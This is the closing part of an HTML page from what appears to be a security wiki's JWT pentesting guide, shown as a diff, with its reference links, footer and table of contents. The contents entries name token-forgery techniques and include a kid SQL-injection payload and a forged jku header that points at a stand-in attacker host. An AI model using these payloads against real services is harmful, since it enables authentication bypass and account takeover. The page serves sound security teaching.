+- https://infosecwriteups.com/jwt-pentesting-a-journey-from-token-to-takeover-1b2a7af08933
+- https://www.vaadata.com/en/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/
+- [RFC 7519 - JWT](https://www.rfc-editor.org/rfc/rfc7519)
+- [RFC 7515 - JWS](https://www.rfc-editor.org/rfc/rfc7515)
+- [RFC 7516 - JWE](https://www.rfc-editor.org/rfc/rfc7516)
+</code></pre></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/JWT.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#jwt">JWT</a>
+      <ul>
+        <li><a href="#introduction-to-json-web-tokens-jwt"><strong>Introduction to JSON Web Tokens (JWT)</strong></a>
+          <ul>
+            <li><a href="#jwt-structure--algorithms"><strong>JWT Structure &amp; Algorithms</strong></a></li>
+            <li><a href="#jwt-claims"><strong>JWT Claims</strong></a></li>
+            <li><a href="#jose-header-parameters"><strong>JOSE Header Parameters</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#common-jwt-vulnerabilities--attacks"><strong>Common JWT Vulnerabilities &amp; Attacks</strong></a>
+          <ul>
+            <li><a href="#1-signature-not-verified-decode-misuse"><strong>1. Signature Not Verified (<code>decode()</code> misuse)</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#tamper-role-claim-and-resend--no-re-signing-needed-if-server-skips-verification">Tamper role claim and resend — no re-signing needed if server skips verification</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#2-alg-none-acceptance"><strong>2. <code>alg: none</code> Acceptance</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#method-2-manual-build">Method 2: Manual build</a></li>
+    <li><a href="#note-the-trailing-dot--empty-signature">Note the trailing dot — empty signature</a></li>
+    <li><a href="#also-try-case-variants--weak-denylists-are-case-sensitive">Also try case variants — weak denylists are case-sensitive:</a></li>
+    <li><a href="#none-none-none">&ldquo;nOnE&rdquo;, &ldquo;None&rdquo;, &ldquo;NONE&rdquo;`</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#3-weak-hmac-secret"><strong>3. Weak HMAC Secret</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#dictionary-attack-fastest">Dictionary attack (fastest)</a></li>
+    <li><a href="#rule-based-catches-variations-like-secret1">Rule-based (catches variations like Secret1!)</a></li>
+    <li><a href="#brute-force-short-secrets">Brute-force short secrets</a></li>
+    <li><a href="#once-cracked--re-sign-with-jwt_tool">Once cracked — re-sign with jwt_tool</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#4-rsaecdsa--hmac-algorithm-confusion"><strong>4. RSA/ECDSA → HMAC Algorithm Confusion</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#or-extract-from-tls-cert">OR extract from TLS cert</a></li>
+    <li><a href="#step-2-if-no-jwks-exposed-recover-public-key-from-2-jwts">Step 2: If no JWKS exposed, recover public key from 2 JWTs</a></li>
+    <li><a href="#outputs-4-candidate-keys--try-all-4">Outputs 4 candidate keys — try all 4</a></li>
+    <li><a href="#step-3-burp-jwt-editor">Step 3: Burp JWT Editor</a></li>
+    <li><a href="#-import-rsa-public-key--attack--hmac-key-confusion-attack">→ Import RSA public key → Attack → HMAC Key Confusion Attack</a></li>
+    <li><a href="#step-4-jwt_tool">Step 4: jwt_tool</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#5-kid-injection"><strong>5. <code>kid</code> Injection</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#other-targets">Other targets:</a></li>
+    <li><a href="#procsyskernelrandomize_va_space">/proc/sys/kernel/randomize_va_space</a></li>
+    <li><a href="#etchostname-if-you-know-it">/etc/hostname (if you know it)`</a></li>
+    <li><a href="#inject-kidx-union-select-attacker_key--">Inject: {&ldquo;kid&rdquo;:&ldquo;x&rsquo; UNION SELECT &lsquo;attacker_key&rsquo;&ndash;&rdquo;}</a></li>
+    <li><a href="#then-sign-jwt-with-attacker_key-as-the-hs256-secret">Then sign JWT with &lsquo;attacker_key&rsquo; as the HS256 secret</a></li>
+    <li><a href="#fuzz-kid-with-jwt_tool">Fuzz kid with jwt_tool</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#6-jku--x5u-remote-key-fetch-abuse"><strong>6. <code>jku</code> / <code>x5u</code> Remote Key Fetch Abuse</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#step-2-build-jwksjson-and-host-it">Step 2: Build jwks.json and host it</a></li>
+    <li><a href="#keysktyrsausesigkidattacker-key-1nmoduluseaqab">{&ldquo;keys&rdquo;:[{&ldquo;kty&rdquo;:&ldquo;RSA&rdquo;,&ldquo;use&rdquo;:&ldquo;sig&rdquo;,&ldquo;kid&rdquo;:&ldquo;attacker-key-1&rdquo;,&ldquo;n&rdquo;:&quot;<modulus>&quot;,&ldquo;e&rdquo;:&ldquo;AQAB&rdquo;}]}</a></li>
+    <li><a href="#step-3-modified-jwt-header">Step 3: Modified JWT header</a></li>
+    <li><a href="#algrs256jkuhttpsyour-servercomjwksjsonkidattacker-key-1">{&ldquo;alg&rdquo;:&ldquo;RS256&rdquo;,&ldquo;jku&rdquo;:&ldquo;<a href="https://your-server.com/jwks.json%22,%22kid%22:%22attacker-key-1%22%7D">https://your-server.com/jwks.json&quot;,&quot;kid&quot;:&quot;attacker-key-1&quot;}</a></a></li>
+    <li><a href="#step-4-sign-with-jwt_tool">Step 4: Sign with jwt_tool</a></li>
+    <li><a href="#burp-shortcut">Burp shortcut:</a></li>
+    <li><a href="#jwt-editor--attack--embedded-jwk-hosts-jwks-automatically">JWT Editor → Attack → Embedded JWK (hosts JWKS automatically)</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#embedded-jwk-trust-cve-2018-0114-class">Embedded <code>jwk</code> Trust (CVE-2018-0114 class)**</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
